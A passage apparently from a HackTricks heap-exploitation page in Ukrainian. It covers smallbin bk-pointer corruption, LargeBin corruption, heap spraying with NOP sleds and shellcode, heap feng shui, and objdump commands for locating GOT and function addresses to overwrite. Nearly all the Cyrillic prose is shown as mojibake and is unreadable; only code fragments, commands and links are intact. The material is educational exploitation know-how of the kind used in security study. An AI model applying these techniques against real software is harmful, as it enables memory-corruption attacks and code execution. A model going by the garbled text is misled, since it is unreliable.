bck = victim->bk; –í–∫–∞–∑—É—î –Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —à–º–∞—Ç–æ–∫, —Ü–µ —î–¥–∏–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è, —è–∫—É –º–∏ –º–æ–∂–µ–º–æ –∑–º—ñ–Ω–∏—Ç–∏.

bin->bk = bck; –ü–µ—Ä–µ–¥–æ—Å—Ç–∞–Ω–Ω—ñ–π —à–º–∞—Ç–æ–∫ —Å—Ç–∞—î –æ—Å—Ç–∞–Ω–Ω—ñ–º, —è–∫—â–æ bck –≤–∫–∞–∑—É—î –Ω–∞ —Å—Ç–µ–∫, –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω–æ–º—É —à–º–∞—Ç–∫—É –±—É–¥–µ –Ω–∞–¥–∞–Ω–∞ —Ü—è –∞–¥—Ä–µ—Å–∞.

bck->fd = bin; –°–ø–∏—Å–æ–∫ –∑–∞–∫—Ä–∏–≤–∞—î—Ç—å—Å—è, –∑–º—É—à—É—é—á–∏ —Ü–µ–π –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ bin.

–ü–æ—Ç—Ä—ñ–±–Ω–æ:

–©–æ–± –±—É–ª–æ –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω–æ –¥–≤–∞ malloc, —Ç–∞–∫ —â–æ –¥–æ –ø–µ—Ä—à–æ–≥–æ –º–æ–∂–Ω–∞ –±—É–ª–æ –± –∑—Ä–æ–±–∏—Ç–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –ø—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ –¥—Ä—É–≥–∏–π –±—É–≤ –∑–≤—ñ–ª—å–Ω–µ–Ω–∏–π —ñ –≤–≤–µ–¥–µ–Ω–∏–π —É —Å–≤—ñ–π bin (—Ç–æ–±—Ç–æ, –±—É–≤ –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω–∏–π malloc, –±—ñ–ª—å—à–∏–π –∑–∞ –¥—Ä—É–≥–∏–π —à–º–∞—Ç–æ–∫ –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è–º).

–©–æ–± malloc, –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω–∏–π –¥–ª—è —è–∫–æ–≥–æ –Ω–∞–¥–∞—î—Ç—å—Å—è –∞–¥—Ä–µ—Å–∞, –≤–∏–±—Ä–∞–Ω–∞ –∞—Ç–∞–∫—É—é—á–∏–º, –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞–ª–∞—Å—è –∞—Ç–∞–∫—É—é—á–∏–º.

–ú–µ—Ç–∞ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ, —è–∫—â–æ –º–∏ –º–æ–∂–µ–º–æ –∑—Ä–æ–±–∏—Ç–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –≤ –∫—É–ø—ñ, —è–∫–∞ –º–∞—î –ø—ñ–¥ —Å–æ–±–æ—é –≤–∂–µ –∑–≤—ñ–ª—å–Ω–µ–Ω–∏–π —à–º–∞—Ç–æ–∫ —ñ –≤ –π–æ–≥–æ bin, –º–∏ –º–æ–∂–µ–º–æ –∑–º—ñ–Ω–∏—Ç–∏ –π–æ–≥–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ bk. –Ø–∫—â–æ –º–∏ –∑–º—ñ–Ω–∏–º–æ –π–æ–≥–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ bk, —ñ —Ü–µ–π —à–º–∞—Ç–æ–∫ —Å—Ç–∞–Ω–µ –ø–µ—Ä—à–∏–º —É —Å–ø–∏—Å–∫—É bin —ñ –±—É–¥–µ –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω–∏–π, bin –±—É–¥–µ –æ–±–º–∞–Ω—É—Ç–æ, —ñ –π–æ–º—É –±—É–¥–µ —Å–∫–∞–∑–∞–Ω–æ, —â–æ –æ—Å—Ç–∞–Ω–Ω—ñ–π —à–º–∞—Ç–æ–∫ —Å–ø–∏—Å–∫—É (–Ω–∞—Å—Ç—É–ø–Ω–∏–π, —â–æ –ø—Ä–æ–ø–æ–Ω—É—î—Ç—å—Å—è) –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –∑–∞ —Ñ–∞–ª—å—à–∏–≤–æ—é –∞–¥—Ä–µ—Å–æ—é, —è–∫—É –º–∏ –≤—Å—Ç–∞–≤–∏–ª–∏ (–Ω–∞ —Å—Ç–µ–∫ –∞–±–æ GOT, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥). –¢–æ–º—É, —è–∫—â–æ –±—É–¥–µ –∑–Ω–æ–≤—É –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω–æ —ñ–Ω—à–∏–π —à–º–∞—Ç–æ–∫, —ñ –∞—Ç–∞–∫—É—é—á–∏–π –º–∞—î –¥–æ –Ω—å–æ–≥–æ –¥–æ—Å—Ç—É–ø, –π–æ–º—É –±—É–¥–µ –Ω–∞–¥–∞–Ω–æ —à–º–∞—Ç–æ–∫ —É –±–∞–∂–∞–Ω—ñ–π –ø–æ–∑–∏—Ü—ñ—ó, —ñ –≤—ñ–Ω –∑–º–æ–∂–µ –∑–∞–ø–∏—Å–∞—Ç–∏ –≤ –Ω—å–æ–≥–æ.

–ü—ñ—Å–ª—è –∑–≤—ñ–ª—å–Ω–µ–Ω–Ω—è –∑–º—ñ–Ω–µ–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –∑–∞—Ä–µ–∑–µ—Ä–≤—É–≤–∞—Ç–∏ —à–º–∞—Ç–æ–∫, –±—ñ–ª—å—à–∏–π –∑–∞ –∑–≤—ñ–ª—å–Ω–µ–Ω–∏–π, —Ç–∞–∫ —â–æ –∑–º—ñ–Ω–µ–Ω–∏–π —à–º–∞—Ç–æ–∫ –≤–∏–π–¥–µ –∑ unsorted bins —ñ –ø–æ—Ç—Ä–∞–ø–∏—Ç—å —É —Å–≤—ñ–π bin.

–Ø–∫ —Ç—ñ–ª—å–∫–∏ –≤—ñ–Ω –ø–æ—Ç—Ä–∞–ø–∏—Ç—å —É —Å–≤—ñ–π bin, –Ω–∞—Å—Ç–∞–≤ —á–∞—Å –∑–º—ñ–Ω–∏—Ç–∏ –π–æ–≥–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ bk –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è, —â–æ–± –≤—ñ–Ω –≤–∫–∞–∑—É–≤–∞–≤ –Ω–∞ –∞–¥—Ä–µ—Å—É, —è–∫—É –º–∏ —Ö–æ—á–µ–º–æ –ø–µ—Ä–µ–ø–∏—Å–∞—Ç–∏.

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, bin –ø–æ–≤–∏–Ω–µ–Ω —á–µ–∫–∞—Ç–∏, –ø–æ–∫–∏ –Ω–µ –±—É–¥–µ –≤–∏–∫–ª–∏–∫–∞–Ω–æ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ —Ä–∞–∑—ñ–≤ malloc(), —â–æ–± –∑–Ω–æ–≤—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑–º—ñ–Ω–µ–Ω–∏–π bin —ñ –æ–±–º–∞–Ω—É—Ç–∏ bin, –∑–º—É—Å–∏–≤—à–∏ –π–æ–≥–æ –ø–æ–≤—ñ—Ä–∏—Ç–∏, —â–æ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —à–º–∞—Ç–æ–∫ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –∑–∞ —Ñ–∞–ª—å—à–∏–≤–æ—é –∞–¥—Ä–µ—Å–æ—é. –ê –ø–æ—Ç—ñ–º –±—É–¥–µ –Ω–∞–¥–∞–Ω–æ —à–º–∞—Ç–æ–∫, —è–∫–∏–π –Ω–∞—Å —Ü—ñ–∫–∞–≤–∏—Ç—å.

–©–æ–± –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —Å–ø—Ä–∞—Ü—é–≤–∞–ª–∞ —è–∫–æ–º–æ–≥–∞ —à–≤–∏–¥—à–µ, —ñ–¥–µ–∞–ª—å–Ω–æ –±—É–ª–æ –±: —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ–≥–æ —à–º–∞—Ç–∫–∞, —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—è —à–º–∞—Ç–∫–∞, —è–∫–∏–π –±—É–¥–µ –∑–º—ñ–Ω–µ–Ω–æ, –∑–≤—ñ–ª—å–Ω–µ–Ω–Ω—è —Ü—å–æ–≥–æ —à–º–∞—Ç–∫–∞, —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—è —à–º–∞—Ç–∫–∞, –±—ñ–ª—å—à–µ–≥–æ –∑–∞ —Ç–æ–π, —â–æ –±—É–¥–µ –∑–º—ñ–Ω–µ–Ω–æ, –∑–º—ñ–Ω–∞ —à–º–∞—Ç–∫–∞ (–≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å), —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—è —à–º–∞—Ç–∫–∞ —Ç–∞–∫–æ–≥–æ –∂ —Ä–æ–∑–º—ñ—Ä—É, —è–∫ –≤—Ä–∞–∑–ª–∏–≤–∏–π, —ñ —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—è –¥—Ä—É–≥–æ–≥–æ —à–º–∞—Ç–∫–∞ —Ç–∞–∫–æ–≥–æ –∂ —Ä–æ–∑–º—ñ—Ä—É, —ñ –≤—ñ–Ω –±—É–¥–µ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ –≤–∏–±—Ä–∞–Ω—É –∞–¥—Ä–µ—Å—É.

–©–æ–± –∑–∞—Ö–∏—Å—Ç–∏—Ç–∏ —Ü—é –∞—Ç–∞–∫—É, –±—É–ª–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ —Ç–∏–ø–æ–≤—É –ø–µ—Ä–µ–≤—ñ—Ä–∫—É, —â–æ —à–º–∞—Ç–æ–∫ ‚Äú–Ω–µ‚Äù —î —Ñ–∞–ª—å—à–∏–≤–∏–º: –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è, —á–∏ bck->fd –≤–∫–∞–∑—É—î –Ω–∞ victim. –¢–æ–±—Ç–æ, –≤ –Ω–∞—à–æ–º—É –≤–∏–ø–∞–¥–∫—É, —á–∏ –≤–∫–∞–∑—É—î –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ fd\* —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ —à–º–∞—Ç–∫–∞, –≤–∫–∞–∑–∞–Ω–æ–≥–æ –≤ —Å—Ç–µ–∫—É, –Ω–∞ victim. –©–æ–± –æ–±—ñ–π—Ç–∏ —Ü—é –ø–µ—Ä–µ–≤—ñ—Ä–∫—É, –∞—Ç–∞–∫—É—é—á–∏–π –ø–æ–≤–∏–Ω–µ–Ω –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º (–Ω–∞–ø–µ–≤–Ω–æ, —á–µ—Ä–µ–∑ —Å—Ç–µ–∫) –∑–∞–ø–∏—Å–∞—Ç–∏ —É –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω—É –∞–¥—Ä–µ—Å—É –∞–¥—Ä–µ—Å—É victim. –©–æ–± —Ç–∞–∫ –≤–∏–≥–ª—è–¥–∞–ª–æ, —è–∫ —Å–ø—Ä–∞–≤–∂–Ω—ñ–π —à–º–∞—Ç–æ–∫.

**–ö–æ—Ä—É–ø—Ü—ñ—è LargeBin**

–ü–æ—Ç—Ä—ñ–±–Ω—ñ —Ç—ñ –∂ –≤–∏–º–æ–≥–∏, —â–æ –π —Ä–∞–Ω—ñ—à–µ, —ñ —â–µ –¥–µ—è–∫—ñ, –∫—Ä—ñ–º —Ç–æ–≥–æ, –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω—ñ —à–º–∞—Ç–∫–∏ –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –±—ñ–ª—å—à–∏–º–∏ –∑–∞ 512.

–ê—Ç–∞–∫–∞ —Ç–∞–∫–∞ –∂, —è–∫ —ñ –ø–æ–ø–µ—Ä–µ–¥–Ω—è, —Ç–æ–±—Ç–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–º—ñ–Ω–∏—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ bk, —ñ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –≤—Å—ñ —Ü—ñ –≤–∏–∫–ª–∏–∫–∏ malloc(), –∞–ª–µ —Ç–∞–∫–æ–∂ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–º—ñ–Ω–∏—Ç–∏ size –∑–º—ñ–Ω–µ–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞ —Ç–∞–∫, —â–æ–± —Ü–µ–π size - nb –±—É–≤ < MINSIZE.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–æ—Ç—Ä—ñ–±–Ω–æ, —â–æ–± size –¥–æ—Ä—ñ–≤–Ω—é–≤–∞–≤ 1552, —â–æ–± 1552 - 1544 = 8 < MINSIZE (–≤—ñ–¥–Ω—ñ–º–∞–Ω–Ω—è –Ω–µ –º–æ–∂–µ –±—É—Ç–∏ –Ω–µ–≥–∞—Ç–∏–≤–Ω–∏–º, –æ—Å–∫—ñ–ª—å–∫–∏ –ø–æ—Ä—ñ–≤–Ω—é—î—Ç—å—Å—è –±–µ–∑–∑–Ω–∞–∫–æ–≤–µ).

–ö—Ä—ñ–º —Ç–æ–≥–æ, –±—É–ª–æ –≤–≤–µ–¥–µ–Ω–æ –ø–∞—Ç—á, —â–æ–± —É—Å–∫–ª–∞–¥–Ω–∏—Ç–∏ —Ü–µ —â–µ –±—ñ–ª—å—à–µ.

**Heap Spraying**

–í –æ—Å–Ω–æ–≤–Ω–æ–º—É, —Ü–µ –ø–æ–ª—è–≥–∞—î –≤ —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—ñ –≤—Å—ñ—î—ó –º–æ–∂–ª–∏–≤–æ—ó –ø–∞–º'—è—Ç—ñ –¥–ª—è –∫—É–ø —ñ –∑–∞–ø–æ–≤–Ω–µ–Ω–Ω—ñ —ó—Ö –º–∞—Ç—Ä–∞—Ü–æ–º –∑ nops, –∑–∞–∫—ñ–Ω—á–µ–Ω–∏—Ö shellcode. –ö—Ä—ñ–º —Ç–æ–≥–æ, —è–∫ –º–∞—Ç—Ä–∞—Ü –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è 0x0c. –û—Å–∫—ñ–ª—å–∫–∏ –±—É–¥–µ —Å–ø—Ä–æ–±–∞ —Å—Ç—Ä–∏–±–Ω—É—Ç–∏ –¥–æ –∞–¥—Ä–µ—Å–∏ 0x0c0c0c0c, —ñ —Ç–∞–∫, —è–∫—â–æ –±—É–¥–µ –ø–µ—Ä–µ–ø–∏—Å–∞–Ω–æ —è–∫—É—Å—å –∞–¥—Ä–µ—Å—É, –¥–æ —è–∫–æ—ó –±—É–¥–µ –≤–∏–∫–ª–∏–∫–∞–Ω–æ, –∑ —Ü–∏–º –º–∞—Ç—Ä–∞—Ü–æ–º, –±—É–¥–µ —Å—Ç—Ä–∏–±–æ–∫ —Ç—É–¥–∏. –í –æ—Å–Ω–æ–≤–Ω–æ–º—É, —Ç–∞–∫—Ç–∏–∫–∞ –ø–æ–ª—è–≥–∞—î –≤ —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—ñ —è–∫–æ–º–æ–≥–∞ –±—ñ–ª—å—à–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –±—É–¥–µ –ø–µ—Ä–µ–ø–∏—Å–∞–Ω–æ —è–∫–∏–π—Å—å –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ —ñ —Å—Ç—Ä–∏–±–Ω—É—Ç–∏ –¥–æ 0x0c0c0c0c, —Å–ø–æ–¥—ñ–≤–∞—é—á–∏—Å—å, —â–æ —Ç–∞–º –±—É–¥—É—Ç—å nops.

**Heap Feng Shui**

–°–∫–ª–∞–¥–∞—î—Ç—å—Å—è –≤ —Ç–æ–º—É, —â–æ–± –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω—å —ñ –∑–≤—ñ–ª—å–Ω–µ–Ω—å –∑–∞—Å—ñ—è—Ç–∏ –ø–∞–º'—è—Ç—å —Ç–∞–∫, —â–æ–± –º—ñ–∂ –≤—ñ–ª—å–Ω–∏–º–∏ —à–º–∞—Ç–∫–∞–º–∏ –∑–∞–ª–∏—à–∞–ª–∏—Å—è –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω—ñ. –ë—É—Ñ–µ—Ä –¥–ª—è –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É–¥–µ —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –≤ –æ–¥–Ω–æ–º—É –∑ —è—î—Ü—å.

**objdump -d –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª** ‚Äî> –î–∏—Å–∞—Å —Ñ—É–Ω–∫—Ü—ñ—ó\
**objdump -d ./PROGRAMA | grep FUNCION** ‚Äî> –û—Ç—Ä–∏–º–∞—Ç–∏ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó\
**objdump -d -Mintel ./shellcodeout** ‚Äî> –©–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —â–æ —Ü–µ –¥—ñ–π—Å–Ω–æ –Ω–∞—à–∞ shellcode —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> –¢–∞–±–ª–∏—Ü—è —Å–∏–º–≤–æ–ª—ñ–≤, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –∞–¥—Ä–µ—Å–∏ –∑–º—ñ–Ω–Ω–∏—Ö —ñ —Ñ—É–Ω–∫—Ü—ñ–π\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> –©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ–π –±—ñ–±–ª—ñ–æ—Ç–µ–∫ (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> –û—Ç—Ä–∏–º—É—î –∞–¥—Ä–µ—Å—É puts –¥–ª—è –ø–µ—Ä–µ–ø–∏—Å—É–≤–∞–Ω–Ω—è –≤ GOT\
**objdump -D ./exec** ‚Äî> –î–∏—Å–∞—Å –í–°–ï –¥–æ –≤—Ö–æ–¥—ñ–≤ plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ —Ñ—É–Ω–∫—Ü—ñ—é –≤ gdb

## –¶—ñ–∫–∞–≤—ñ –∫—É—Ä—Å–∏

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **–ü–æ—Å–∏–ª–∞–Ω–Ω—è**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
